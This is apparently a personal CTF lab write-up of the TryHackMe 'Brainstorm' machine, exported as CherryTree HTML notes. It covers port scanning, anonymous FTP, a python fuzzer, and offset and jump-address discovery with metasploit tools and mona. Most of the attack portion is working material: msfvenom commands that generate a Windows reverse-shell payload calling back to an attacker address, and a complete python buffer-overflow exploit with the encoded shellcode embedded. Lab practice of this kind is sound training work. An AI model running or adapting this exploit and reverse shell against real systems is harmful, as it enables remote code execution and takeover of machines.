<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>brainstorm</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>brainstorm</h1><br/><strong>Brainstorm</strong><br /><br />Nmap Shows 3 open ports: 21,3389,9999<br /><br />FTP : 21<br />RDP : 3389<br />Chat Service : 9999 (Found out after connecting)<br /><br />THM answer for No of Open ports: 6<br /><br /><br />We connect to the machine with anonymous ftp login.<br />Change mode to passive. (Else the “ls” command is stuck and won&#39;t work)<br /><br /><br /><img src="images/14-1.png" alt="images/14-1.png" /><br /><br />Changed to Binary mode using “<strong>binary</strong>” before tranferring the files.<br /><br /><img src="images/14-2.png" alt="images/14-2.png" /><br /><br />Run the executible in a local windows 10 machine for research.<br /><br />We fuzz the machine using the following fuzzer.<br /><br />#!/usr/bin/env python3<br /><br />import socket, time, sys<br /><br />ip = &quot;11.11.11.123&quot;<br /><br />port = 9999<br />timeout = 5<br /><br />prefix = &quot;&quot;<br />string = prefix + &quot;A&quot; * 100<br /><br />while True:<br />  try:<br />    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:<br />      s.settimeout(timeout)<br />      s.connect((ip, port))<br />      s.recv(1024)<br />      print(&quot;Fuzzing Username: with {} bytes&quot;.format(len(string) - len(prefix)))<br />      s.send(bytes(string, &quot;latin-1&quot;))<br />      s.recv(1024)<br />      print(&quot;Fuzzing Message: with {} bytes&quot;.format(len(string) - len(prefix)))<br />      s.send(bytes(string, &quot;latin-1&quot;))<br />      s.recv(1024)<br />  except:<br />    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))<br />    sys.exit(0)<br />  string += 100 * &quot;A&quot;<br />  time.sleep(1)<br />  <br />  <br />  The program crashed at 2200 bytes.<br />  We create a pattern of 2200 bytes using metasploit tools.<br />  <br />  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200<br />  <br />  Then find the offset point using metasploit<br />  <br /><br /><img src="images/14-3.png" alt="images/14-3.png" /><br /><br /><br /><strong>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 31704330</strong><br /><br /><img src="images/14-4.png" alt="images/14-4.png" /><br /><br />Or use mona script to find out offset <strong>2012</strong><br /><br /><img src="images/14-5.png" alt="images/14-5.png" /><br /><br /><br /><strong>!mona findmsp -distance 2200</strong><br /><br /><br />Then i built the exploit the python file using the reverse enginering techniques.<br /><br />A) Find badchars : “\x00” : No others were found<br /><br />B) find jump point<br /><br /><br /><img src="images/14-6.png" alt="images/14-6.png" /><br /><br />Select a jump address and put it in retn using little endian format.<br /><strong>625014EB<br />retn = &quot;\xEB\x14\x50\x62&quot;<br /></strong><br />C) add NOP paddings. “\x90” * 16<br /><br /><br />D) put the shellcode in payload<br /><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -e x86/shikata_ga_nai -b &quot;\x00&quot; -f python -v payload</strong></em><br />Internet Style to get a varibale named payload. (To copy paste as it is)<br /><br /><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -b &quot;\x00&quot; -f c</strong></em><br />Tryhackme style. (Copy the code part only into parenthesis of payload)<br /><br /><br />E) start the listener<br /><br />F) run the exploit<br /><br /><br />Use the following python exploit.<br />#!/usr/bin/env python3<br /><br />import socket, time, sys<br /><br />ip = &quot;10.10.156.93&quot;<br />#625014EB<br />port = 9999<br />timeout = 5<br /><br />username = &quot;brainstormZ&quot;<br />prefix = &quot;&quot;<br /><br />offset = 2012<br />overflow = &quot;A&quot; * offset<br />retn = &quot;\xEB\x14\x50\x62&quot;<br />padding = &quot;\x90&quot; * 16<br />payload = (&quot;\xda\xde\xd9\x74\x24\xf4\xba\xb6\x9e\x8a\x34\x5e\x33\xc9\xb1&quot;<br />&quot;\x52\x31\x56\x17\x83\xee\xfc\x03\xe0\x8d\x68\xc1\xf0\x5a\xee&quot;<br />&quot;\x2a\x08\x9b\x8f\xa3\xed\xaa\x8f\xd0\x66\x9c\x3f\x92\x2a\x11&quot;<br />&quot;\xcb\xf6\xde\xa2\xb9\xde\xd1\x03\x77\x39\xdc\x94\x24\x79\x7f&quot;<br />&quot;\x17\x37\xae\x5f\x26\xf8\xa3\x9e\x6f\xe5\x4e\xf2\x38\x61\xfc&quot;<br />&quot;\xe2\x4d\x3f\x3d\x89\x1e\xd1\x45\x6e\xd6\xd0\x64\x21\x6c\x8b&quot;<br />&quot;\xa6\xc0\xa1\xa7\xee\xda\xa6\x82\xb9\x51\x1c\x78\x38\xb3\x6c&quot;<br />&quot;\x81\x97\xfa\x40\x70\xe9\x3b\x66\x6b\x9c\x35\x94\x16\xa7\x82&quot;<br />&quot;\xe6\xcc\x22\x10\x40\x86\x95\xfc\x70\x4b\x43\x77\x7e\x20\x07&quot;<br />&quot;\xdf\x63\xb7\xc4\x54\x9f\x3c\xeb\xba\x29\x06\xc8\x1e\x71\xdc&quot;<br />&quot;\x71\x07\xdf\xb3\x8e\x57\x80\x6c\x2b\x1c\x2d\x78\x46\x7f\x3a&quot;<br />&quot;\x4d\x6b\x7f\xba\xd9\xfc\x0c\x88\x46\x57\x9a\xa0\x0f\x71\x5d&quot;<br />&quot;\xc6\x25\xc5\xf1\x39\xc6\x36\xd8\xfd\x92\x66\x72\xd7\x9a\xec&quot;<br />&quot;\x82\xd8\x4e\xa2\xd2\x76\x21\x03\x82\x36\x91\xeb\xc8\xb8\xce&quot;<br />&quot;\x0c\xf3\x12\x67\xa6\x0e\xf5\x82\x3c\x58\x1a\xfb\x40\x58\x3a&quot;<br />&quot;\x9a\xcd\xbe\x28\x4c\x98\x69\xc5\xf5\x81\xe1\x74\xf9\x1f\x8c&quot;<br />&quot;\xb7\x71\xac\x71\x79\x72\xd9\x61\xee\x72\x94\xdb\xb9\x8d\x02&quot;<br />&quot;\x73\x25\x1f\xc9\x83\x20\x3c\x46\xd4\x65\xf2\x9f\xb0\x9b\xad&quot;<br />&quot;\x09\xa6\x61\x2b\x71\x62\xbe\x88\x7c\x6b\x33\xb4\x5a\x7b\x8d&quot;<br />&quot;\x35\xe7\x2f\x41\x60\xb1\x99\x27\xda\x73\x73\xfe\xb1\xdd\x13&quot;<br />&quot;\x87\xf9\xdd\x65\x88\xd7\xab\x89\x39\x8e\xed\xb6\xf6\x46\xfa&quot;<br />&quot;\xcf\xea\xf6\x05\x1a\xaf\x17\xe4\x8e\xda\xbf\xb1\x5b\x67\xa2&quot;<br />&quot;\x41\xb6\xa4\xdb\xc1\x32\x55\x18\xd9\x37\x50\x64\x5d\xa4\x28&quot;<br />&quot;\xf5\x08\xca\x9f\xf6\x18&quot;)<br /><br />string = overflow + retn + padding + payload<br /><br />overflow = &quot;A&quot; * offset<br />retn = &quot;&quot;<br />padding = &quot;&quot;<br />payload = &quot;&quot;<br />postfix = &quot;&quot;<br /><br /><br />s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br /><br />try:<br />  s.connect((ip, port))<br />  print(&quot;Delivering Payload into brainstorm.&quot;)<br />  s.send(bytes(username, &quot;latin-1&quot;))<br />  time.sleep(1)<br />  s.send(bytes(string, &quot;latin-1&quot;))<br />  print(&quot;Done!&quot;)<br /><br />except:<br />  print(&quot;Could not connect.&quot;)<br />  <br />  <br />  <br />  <img src="images/14-7.png" alt="images/14-7.png" /><br />  <br /><br /><img src="images/14-8.png" alt="images/14-8.png" /><br /><br /><img src="images/14-9.png" alt="images/14-9.png" /><br /><br /><img src="images/14-10.png" alt="images/14-10.png" /><br /><br /><br />Note: Much explanation is not there for exploit creation as it is completely same as the &quot;<strong>CybeXRay Guides -----→ Reverse Engineering -----→ Buffer Overflows Using ID &amp; mona</strong>&quot;<br /><br /></div>
</body>
</html>
